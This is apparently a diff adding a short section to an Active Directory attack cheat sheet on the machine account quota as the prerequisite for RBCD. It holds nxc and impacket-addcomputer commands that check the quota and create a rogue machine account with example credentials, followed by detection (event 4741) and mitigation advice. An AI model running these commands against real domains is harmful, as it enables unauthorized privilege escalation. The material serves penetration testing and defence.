@@ -21,3 +21,15 @@ Any authenticated user can create machine accounts — the prerequisite for **RB
 
 ### Commands
 ```bash
+# ── Check MAQ ────────────────────────────────────────────────────────
+nxc ldap 10.10.10.5 -u lowpriv -p 'Password123!' -M maq
+
+# ── Create a machine account ─────────────────────────────────────────
+impacket-addcomputer -computer-name 'PWN$' -computer-pass 'Pwn123!' \
+  -dc-ip 10.10.10.5 corp.local/lowpriv:'Password123!'
+```
+
+### Detection and defensive measures
+**4741** machine account creation by non-machine principals; set MAQ to **0** and delegate creation to a tier-0 group.
+
+---
